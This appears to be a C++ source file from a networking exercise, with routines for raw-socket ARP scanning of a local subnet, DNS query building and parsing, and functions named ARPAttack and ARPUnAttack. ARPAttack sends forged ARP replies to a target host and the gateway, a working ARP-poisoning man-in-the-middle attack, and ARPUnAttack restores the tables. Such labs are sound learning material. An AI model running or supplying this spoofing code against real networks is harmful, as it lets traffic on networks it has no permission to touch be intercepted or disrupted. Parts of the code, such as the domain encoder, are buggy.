#include "ARPOperate.h"
#include <fcntl.h>
#include <unistd.h>
#include<chrono>
using namespace std::chrono;

void askARP(IAM *pIAM) {
  //我打算先写单线程
  countType count;
  count.mtx.unlock();
  count.count=0;
  etherPack ARPPack;
  //mutex mtx;
  //mtx.unlock();
  // mtx.unlock();
  // multThreadBroadcast(ARPPack,pIAM,0,255,count);
  for (int i = 0; i < 8; i++) {
    std::thread t(multThreadBroadcast, pIAM, i * 32, i * 32 + 31,
                  std::ref(count));
    t.detach();
  }
  while (1) {
    if (count.count == 8) {
      return;
    } else {
      std::this_thread::sleep_for(milliseconds(1000));
    }
  }
}

void multThreadBroadcast(IAM *pIAM, int beg, int end,
                         countType &count) {
  int fd = socket(PF_PACKET, SOCK_RAW, htons(0xffff));
  fcntl(fd, F_SETFL, O_NONBLOCK);
  if (fd <= 0) {
    perror("Error");
    return;
  }
  sockaddr_ll sal;
  etherPack ARPPack;
  memset(&sal, 0, sizeof(sal));
  sal.sll_family = PF_PACKET;
  sal.sll_ifindex = 3;
  for (int i = beg; i <= end; i++) {
    /*if(count.mtx.try_lock()){
      std::cout<<i<<std::endl;
      count.mtx.unlock();
    }*/
    ARPPack.ARP.distIP[3] = byte(i);
    if (sendto(fd, &ARPPack, sizeof(ARPPack), 0, (sockaddr *)&sal,
               sizeof(sal)) <= 0) {
      perror("error");
      continue;
    }
    //std::cout << "OK" << std::endl;
    etherPack recv;
    memset(&recv, 0, sizeof(recv));
    sockaddr_ll sar;
    memset(&sar, 0, sizeof(sar));
    unsigned sarLen;
    int recvfd = socket(PF_PACKET, SOCK_RAW, htons(0x0806));
    fcntl(recvfd, F_SETFL, O_NONBLOCK);
    if (recvfd <= 0) {
      perror("Error");
      return;
    }
    std::this_thread::sleep_for(milliseconds(1000));
    int recvFlag =
        recvfrom(recvfd, &recv, sizeof(recv), 0, (sockaddr *)&sal, &sarLen);
    //std::cout << "OK" << std::endl;
    int id=recv.ARP.hostIP[3];

    //printf("%d\n",id);
    if (recvFlag > 0) {
      memcpy(pIAM[id].IP, recv.ARP.hostIP, 4);
      memcpy(pIAM[id].MAC, recv.ARP.hostMAC, 6);
    }
    close(recvfd);
  }
  close(fd);
  while (1) {
    if (count.mtx.try_lock()) {
      count.count++;
      count.mtx.unlock();
      break;
    } else {
      std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
  }
}

void IAMPrint(IAM *pIAM) {
  int count = 0;
  for (int i = 1; i <= 255; i++) {
    if (pIAM[i].IP[3] ==i) {
      count++;
      printf("IP:%d",pIAM[i].IP[0]);
      for(int j = 1;j<=3;j++) printf(".%d",pIAM[i].IP[j]);
      printf("\n");
      printf("MAC:%02x",pIAM[i].MAC[0]);
      for(int j = 1;j<=5;j++) printf(".%d",pIAM[i].MAC[j]);
      printf("\n\n");
    }
  }
  std::cout << count << std::endl;
}

void ARPAttack(int target, IAM *pIAM) {
  byte gateway[4]={0xc0,0xa8,0x01,0x01};
  std::cout<<pIAM[target].IP[3]<<std::endl;
  if (pIAM[target].IP[3] == 0) {
    printf("Can't find the target\n");
    return;
  }
  sockaddr_ll sal;
  memset(&sal, 0, sizeof(sal));
  sal.sll_family = PF_PACKET;
  sal.sll_ifindex = 3;
  int fd = socket(PF_PACKET, SOCK_RAW, htons(0xffff));
  fcntl(fd, F_SETFL, O_NONBLOCK);
  if (fd <= 0) {
    perror("Error");
    return;
  }
  etherPack ARPPackToTarget;
  etherPack ARPPackToGateway;
  ARPPackToTarget.ARP.opt[1] = 0x02;
  memcpy(ARPPackToTarget.ARP.hostIP,gateway,4);
  //memcpy(ARPPackToTarget.etherHeader.etheShost,pIAM[1].MAC,6);
  memcpy(ARPPackToTarget.ARP.distIP,pIAM[target].IP,4);
  memcpy(ARPPackToTarget.ARP.distMAC,pIAM[target].MAC,6);
  ARPPackToGateway.ARP.opt[1]=0x02;
  memcpy(ARPPackToGateway.ARP.hostIP,pIAM[1].IP,4);
  //memcpy(ARPPackToGateway.ARP.hostMAC,pIAM[1].MAC,4);
  memcpy(ARPPackToGateway.ARP.distIP,pIAM[target].IP,4);
  memcpy(ARPPackToGateway.ARP.distMAC,pIAM[target].MAC,6);
  for (int i = 1; i <= 100; i++) {
    std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    if (sendto(fd, &ARPPackToTarget, sizeof(ARPPackToTarget), 0, (sockaddr *)&sal,
               sizeof(sal)) <= 0) {
      perror("error");
      continue;
    }
    //memcpy
    if (sendto(fd, &ARPPackToGateway, sizeof(ARPPackToGateway), 0, (sockaddr *)&sal,
               sizeof(sal)) <= 0) {
      perror("error");
      continue;
    }
  }
  // memcpy(ARPPack.ARP.IP,pIAM[tar])
}


void  ARPUnAttack(int target,IAM *pIAM){
  byte gateway[4]={0xc0,0xa8,0x01,0x01};
  std::cout<<pIAM[target].IP[3]<<std::endl;
  if (pIAM[target].IP[3] == 0) {
    printf("Can't find the target\n");
    return;
  }
  sockaddr_ll sal;
  memset(&sal, 0, sizeof(sal));
  sal.sll_family = PF_PACKET;
  sal.sll_ifindex = 3;
  int fd = socket(PF_PACKET, SOCK_RAW, htons(0xffff));
  fcntl(fd, F_SETFL, O_NONBLOCK);
  if (fd <= 0) {
    perror("Error");
    return;
  }
  etherPack ARPPackToTarget;
  etherPack ARPPackToGateway;
  ARPPackToTarget.ARP.opt[1] = 0x02;
  memcpy(ARPPackToTarget.ARP.hostIP,pIAM[1].IP,4);
  memcpy(ARPPackToTarget.ARP.hostMAC,pIAM[1].MAC,6);
  memcpy(ARPPackToTarget.etherHeader.etheShost,pIAM[1].MAC,6);
  //memcpy(ARPPackToTarget.etherHeader.etheShost,pIAM[1].MAC,6);
  memcpy(ARPPackToTarget.ARP.distIP,pIAM[target].IP,4);
  memcpy(ARPPackToTarget.ARP.distMAC,pIAM[target].MAC,6);
  ARPPackToGateway.ARP.opt[1]=0x02;
  memcpy(ARPPackToGateway.ARP.hostIP,pIAM[target].IP,4);
  memcpy(ARPPackToGateway.etherHeader.etheShost,pIAM[target].MAC,6);
  //memcpy(ARPPackToGateway.ARP.hostMAC,pIAM[1].MAC,4);
  memcpy(ARPPackToGateway.ARP.hostMAC,pIAM[target].MAC,6);
  memcpy(ARPPackToGateway.ARP.distIP,pIAM[1].IP,4);
  memcpy(ARPPackToGateway.ARP.distMAC,pIAM[1].MAC,6);
  for (int i = 1; i <= 100; i++) {
    std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    if (sendto(fd, &ARPPackToTarget, sizeof(ARPPackToTarget), 0, (sockaddr *)&sal,
               sizeof(sal)) <= 0) {
      perror("error");
      continue;
    }
    //memcpy
    if (sendto(fd, &ARPPackToGateway, sizeof(ARPPackToGateway), 0, (sockaddr *)&sal,
               sizeof(sal)) <= 0) {
      perror("error");
      continue;
    }
  }
}

void queryDNS(char *DNS){
  //printf("%s\n",DNS);
  int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  DNSPack aDNSPack;
  /*aaDNSPack.header.flags[0]={0x01,0x00};
  aDNSPack.header.qdcount={0x12,0x34};
  aDNSPack.header.ancount={0x00,0x01};
  aDNSPack.header.nscount={0x00,0x00};
  aDNSPack.header.arcount={0x00,0x00};*/
  //aDNSPack.question.qname=new byte[DNSLength+1];
  char *domain=getDomain(DNS);
  //printf("%s\n",domain);
  int domainLength=strlen(domain);
  domain[domainLength++]=0x00;
  //printf("%d\n",domainLength);
  //memcpy()
  //memcpy(aDNSPack.question.qname,domain,domainLength);
  /*aDNSPack.question.qtype={0x00,0x01};
  aDNSPack.question.qclass={0x00,0x01};*/
  sockaddr_in dist;
  dist.sin_addr.s_addr = inet_addr("8.8.8.8");
  dist.sin_port = htons(53);
  dist.sin_family = AF_INET;
  byte buff[1024];
  //printf("")
  memset(buff,0,sizeof(buff));
  //std::cout<<aDNSPack.header.ID[0];
  memcpy(buff,&aDNSPack.header,12);

  memcpy(buff+12,domain,domainLength);
  memcpy(buff+12+domainLength,&aDNSPack.question,4);
  /*for(int i = 0;i<16+domainLength;i++){
    printf("%02x",buff[i]);
  }*/
  //printf("%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",buff)
  //std::cout<<buff[0]<<buff[1]<<buff[2]<<buff[3]<<buff[4]<<buff[5]<<buff[6]<<std::endl;
  //5memcpy(buff+12+domainLength,&)
  //strcat(buff,aDNSPack.header);
  //strcat(buff,aDNSPack.question);
  //memcpy(buff,aDNSPack.header,sizedof(aDNSPack.header));
  //memcpy(buff,aDNSPack.question,sizeof(aDNSPack.question));
  int sendSuccessFlag=sendto(fd,buff,16+domainLength,0, (sockaddr *) &dist, sizeof(dist));
  //printf("OK\n");
  if (sendSuccessFlag<0){
    perror("error");
    return;
  }
  memset(buff,0,sizeof(buff));
  socklen_t distSize=sizeof(dist);
  int recvSuccessFlag = recvfrom(fd, buff, 1024, 0, (sockaddr *) &dist, &distSize);
  //std::cout<<"Ok";
  if(recvSuccessFlag<0){
    perror("error");
    return;
  }
  resolveDNS(buff,recvSuccessFlag,16+domainLength);

  aDNSPack.question.qtype[1]=0x1c;
  memcpy(buff,&aDNSPack.header,12);

  memcpy(buff+12,domain,domainLength);
  memcpy(buff+12+domainLength,&aDNSPack.question,4);
  sendSuccessFlag=sendto(fd,buff,16+domainLength,0, (sockaddr *) &dist, sizeof(dist));
  //printf("OK\n");
  if (sendSuccessFlag<0){
    perror("error");
    return;
  }
  memset(buff,0,sizeof(buff));
  distSize=sizeof(dist);
  recvSuccessFlag = recvfrom(fd, buff, 1024, 0, (sockaddr *) &dist, &distSize);
  //std::cout<<"Ok";
  if(recvSuccessFlag<0){
    perror("error");
    return;
  }
  resolveDNS(buff,recvSuccessFlag,16+domainLength);
  close(fd);
}

char *getDomain(char *DNS){
  int DNSLength=strlen(DNS);
  char * tmpDNS=DNS;
  char *domain;
  domain =new char[1024];
  int length=0;
  for(int i = 0;i<DNSLength;i++){
    if(tmpDNS[i]!='.') length++;
    else{
      char tmp[2];
      //memcpy(tmp,std::to_string(length).c_str(),1);
      tmp[0]=(char)(length&0x00ff);
      tmp[1]=(char)(length&0xff00);
      strcat(domain,tmp);
      strncat(domain,DNS,length);
      DNS=DNS+length+1;
      length=0;
    }
  }
  char tmp[2];
  //memcpy(tmp,std::to_string(length).c_str(),1);
  tmp[0]=(char)(length&0x00ff);
  tmp[1]=(char)(length&0xff00);
  strcat(domain,tmp);
  //strcat(domain,(std::to_string(length).c_str()));
  strncat(domain,DNS,length);
  return  domain;
}

void resolveDNS(byte *buff,int buffSize,int ansPosition){
  DNSPack aDNSPack;
  memset(&aDNSPack,0,sizeof(aDNSPack));
  memcpy(&aDNSPack.header,buff,12);
  int ansCount=aDNSPack.header.ancount[0]*256+aDNSPack.header.ancount[1];
  if(ansCount==0) return;
  int tmpPosition=ansPosition;
  while(tmpPosition<buffSize){
    DNSPart ansPart;
    memcpy(&ansPart,buff+tmpPosition,sizeof(ansPart));
    tmpPosition+=sizeof(ansPart);
    int length=ansPart.RDLENGTH[0]*256+ansPart.RDLENGTH[1];
    printf("%d\n",length);
    byte *ansBuff=new byte[length];
    memcpy(ansBuff,buff+tmpPosition,length);
    //printf("%s",ansBuff);
    //tmpPosition+=length;
    if(ansPart.TYPE[1]==0x05){
      printf("CNAME:");
      int tmpLen=0;
      bool comFlag=0;
      byte len;
      while(buff[tmpLen+tmpPosition]!=0x00){
        len=buff[tmpLen+tmpPosition];
        if(ansBuff[tmpLen+len+1]==0xc0){
          comFlag=1;
          break;
        }
        ansBuff[len+tmpLen+1]='.';
        tmpLen+=len+1;
      }
      ansBuff[tmpLen+len+1]='\0';
      if (comFlag) {
        printf("%s.com\n", ansBuff+ 1);
      } else {
        printf("%s\n", ansBuff + 1);
      }
      delete ansBuff;
    }else if(ansPart.TYPE[1]==0x01){
      printf("IP: %d",buff[tmpPosition]);
      for(int i = 1;i<=3;i++) printf(".%d",buff[tmpPosition+i]);
      printf("\n");
    }else if(ansPart.TYPE[1]==0x1c){
      printf("IP: %02x",buff[tmpPosition]);
      for(int i = 1;i<=15;i++) printf(".%02x",buff[tmpPosition+i]);
    }
    tmpPosition+=length;
  }
}
